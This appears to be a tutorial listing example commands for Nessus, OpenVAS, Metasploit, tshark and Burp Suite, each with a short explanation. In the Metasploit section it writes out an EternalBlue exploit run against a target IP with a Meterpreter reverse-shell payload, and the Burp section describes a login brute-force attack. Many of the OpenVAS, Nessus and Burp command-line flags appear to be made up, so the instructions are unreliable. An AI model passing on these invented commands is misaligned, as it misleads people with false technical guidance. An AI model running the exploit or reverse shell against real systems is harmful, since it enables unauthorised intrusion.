1. Vulnerability Scanning with Nessus
Nessus is one of the most widely used commercial vulnerability scanning tools.

Example Commands:

Start a scan from the command line:

''nessus -q -T html -o /output/scan_report.html -i /path/to/scan_config.nessus''

Explanation: This command runs Nessus using the specified configuration file and outputs the results in HTML format.

-Target a specific IP address:
''nessus -q -T html -o /output/report.html -i /path/to/scan.nessus --targets 192.168.1.1''

Explanation: This command targets the specified IP address for scanning.

-Perform a custom port scan:
''nessus -q -T html -o /output/custom_ports_report.html --ports 80,443,8080''

Explanation: This command limits the scan to ports 80, 443, and 8080 only.

-Scan for specific CVEs:
''nessus -q -T html -o /output/cve_scan_report.html --cve 2017-0143, 2018-8174''

Explanation: This command scans for the specified CVE vulnerabilities.

-Use a specific scan policy:
''nessus -q -T html -o /output/policy_scan_report.html --policy "Critical Scan Policy" ''

Explanation: This command uses a custom scan policy named "Critical Scan Policy" to perform the scan.

2. Vulnerability Scanning with OpenVAS
OpenVAS is an open-source alternative to Nessus, capable of detecting vulnerabilities in systems and applications.

Example Commands:
-Start a scan:

openvas-start

openvas-cli --scan --target 192.168.1.1 --profile "Full and Fast" --output /output/openvas_report.html

Explanation: This starts the OpenVAS service and initiates a scan with the "Full and Fast" profile for the target IP.

-Scan specific ports:

openvas-cli --scan --target 192.168.1.1 --ports 22,80,443 --profile "Full and Fast"

Explanation: This command targets ports 22, 80, and 443 for scanning.

-Run a scan on a specific target:

openvas-cli --target 192.168.1.1 --scan --profile "Full and Fast" --output /output/target_scan.html

Explanation: This command scans a specific target using the "Full and Fast" profile.

-Scan for high-severity vulnerabilities only:

openvas-cli --scan --target 192.168.1.1 --severity High --output /output/high_risk_report.html

Explanation: This command scans only for high-severity vulnerabilities.

-Scan for specific CVE:

openvas-cli --scan --target 192.168.1.1 --cve "CVE-2017-0143" --output /output/cve_specific_scan.html


Explanation: This command scans for a specific CVE vulnerability.

3. Penetration Testing with Metasploit
Metasploit is a widely-used penetration testing framework that allows attackers to simulate real-world attacks.

Example Commands:

-Start Metasploit console:

msfconsole

Explanation: This command opens the Metasploit console.

-Exploit a specific vulnerability:

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.1
set RPORT 445
exploit

Explanation: This exploits the MS17-010 vulnerability (EternalBlue) against the target IP.

-Set a payload for reverse shell:

set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit

Explanation: This sets up a reverse TCP Meterpreter payload on the target system.

-Use an auxiliary scanner for port scanning:

use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.1
set THREADS 10
run


Explanation: This runs a TCP port scan on the target IP.

-Scan for directory and file brute-force:

use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.1
set DIRLIST /path/to/wordlist.txt
run


Explanation: This uses Metasploitâ€™s auxiliary module to perform directory brute-forcing on a web server.

4. Network Traffic Analysis with Wireshark
Wireshark is the most widely used tool for analyzing network traffic and identifying potential security threats.

Example Commands:

-Capture packets on a specific interface:

tshark -i eth0 -w /output/network_traffic.pcap

Explanation: This command captures all traffic on interface eth0 and saves it to a .pcap file.

-Filter HTTP traffic:

tshark -i eth0 -f "tcp port 80" -w /output/http_traffic.pcap

Explanation: This command captures only HTTP traffic (port 80) on the network interface.

-Filter traffic from a specific IP address:

tshark -i eth0 -f "host 192.168.1.1" -w /output/ip_traffic.pcap

Explanation: This command filters and captures only traffic from the IP address 192.168.1.1.

-Get network traffic statistics:

tshark -z io,stat,0

Explanation: This command provides statistical analysis of the captured network traffic.

Capture only UDP packets:

tshark -i eth0 -f "udp" -w /output/udp_traffic.pcap

Explanation: This command captures only UDP traffic.

5. Web Application Security Testing with Burp Suite
Burp Suite is a comprehensive platform used for testing the security of web applications, identifying vulnerabilities, and performing active scanning.

Example Commands:

-Start Burp Suite with a proxy:

burpsuite --proxy 127.0.0.1:8080

Explanation: This command starts Burp Suite with a proxy listening on localhost (127.0.0.1) at port 8080.

Initiate an active scan on a web application:

burpsuite --crawl http://targetsite.com --scan --output /output/burp_scan_report.html

Explanation: This command crawls the web application at the specified URL and performs an active scan.

-Use Intruder to perform brute force attacks:

burpsuite --intruder --target http://targetsite.com/login --payloads /path/to/wordlist.txt --attack-type brute-force
Explanation: This runs a brute force attack on a login page using a specified wordlist.

Spider the target to discover hidden resources:

burpsuite --spider http://targetsite.com --depth 5 --output /output/spider_report.html

Explanation: This command uses Burp Suite's Spider tool to discover all the resources and links within a web application.

Scan a web application for vulnerabilities:

burpsuite --scanner --target http://targetsite.com --output /output/vulnerability_report.html

Explanation: This command runs an automated scan on a target web application to identify vulnerabilities.
